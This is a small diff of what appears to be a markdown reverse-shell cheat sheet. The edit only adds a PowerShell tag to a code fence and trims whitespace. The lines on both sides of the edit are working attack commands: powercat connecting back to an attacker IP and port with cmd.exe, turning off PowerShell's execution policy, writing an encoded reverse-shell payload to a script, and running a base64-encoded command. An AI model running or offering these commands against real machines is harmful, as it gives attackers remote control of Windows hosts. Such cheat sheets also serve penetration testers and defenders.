@@ -18,9 +18,9 @@ powercat -c <IP> -p <PORT> -e cmd.exe
 
 #### Encripted payload
 Enable script execution
-```
+```powershell
 > Set-ExecutionPolicy Unrestricted
->  powercat -c <IP> -p <PORT> -e cmd.exe -ge > reverseshell.ps1
+> powercat -c <IP> -p <PORT> -e cmd.exe -ge > reverseshell.ps1
 > powershell -E AaQBtAEUAbgBkACgAIgBgAHIAI[...]
 ```
 
